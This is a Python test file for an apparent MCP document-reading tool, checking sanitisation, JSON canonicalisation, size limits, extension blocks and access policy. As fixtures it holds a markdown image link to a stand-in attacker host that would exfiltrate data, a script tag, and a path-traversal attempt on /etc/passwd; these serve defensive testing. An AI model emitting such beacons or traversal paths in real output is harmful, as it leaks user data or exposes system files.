import json

import pytest
from fastmcp.exceptions import ToolError

from arrowhead.authz.enforce import get_authorizer
from arrowhead.config import get_settings
from arrowhead.tools.doc_read import doc_read


async def test_read_text_document_sanitized_and_wrapped(docs):
    (docs / "log.txt").write_text("line\x1b[31m red\x00 here")
    result = await doc_read("log.txt")
    assert result["metadata"]["source"] == "log.txt"
    assert result["metadata"]["format"] == "txt"
    assert "\x1b" not in result["content"]
    assert "\x00" not in result["content"]
    assert "notice" in result


async def test_read_markdown_neutralizes_exfiltration(docs):
    (docs / "page.md").write_text(
        "![x](http://attacker.example/?s=1) <script>evil()</script> text"
    )
    result = await doc_read("page.md")
    assert "attacker.example" not in result["content"]
    assert "<script>" not in result["content"]
    assert result["metadata"]["format"] == "md"


async def test_read_json_canonicalized_under_bounds(docs):
    (docs / "data.json").write_text('{"b": 2, "a": 1}')
    result = await doc_read("data.json")
    body = result["content"].split("\n", 1)[1].rsplit("\n", 1)[0]
    assert json.loads(body) == {"a": 1, "b": 2}
    assert result["metadata"]["format"] == "json"


async def test_read_invalid_json_rejected(docs):
    (docs / "bad.json").write_text('{"a": 1, "a": 2}')
    with pytest.raises(ToolError):
        await doc_read("bad.json")


async def test_traversal_rejected(docs):
    with pytest.raises(ToolError):
        await doc_read("../../etc/passwd.txt")


async def test_disallowed_extension_rejected(docs):
    (docs / "secrets.env").write_text("KEY=1")
    with pytest.raises(ToolError):
        await doc_read("secrets.env")


async def test_missing_document_rejected(docs):
    with pytest.raises(ToolError):
        await doc_read("nope.txt")


async def test_oversized_document_rejected(docs, monkeypatch):
    monkeypatch.setenv("ARROWHEAD_DOC_MAX_BYTES", "8")
    get_settings.cache_clear()
    (docs / "big.txt").write_text("x" * 64)
    with pytest.raises(ToolError):
        await doc_read("big.txt")


async def test_read_denied_by_policy(docs, monkeypatch):
    monkeypatch.setenv("ARROWHEAD_AUTH_ENABLED", "true")
    monkeypatch.setenv(
        "ARROWHEAD_AUTHZ_POLICY",
        '{"grants": [{"subject": "*", "actions": ["read"], "prefix": "public/"}]}',
    )
    get_settings.cache_clear()
    get_authorizer.cache_clear()
    (docs / "public").mkdir()
    (docs / "public" / "ok.txt").write_text("fine")
    (docs / "secret.txt").write_text("hidden")

    assert (await doc_read("public/ok.txt"))["content"]
    with pytest.raises(ToolError):
        await doc_read("secret.txt")
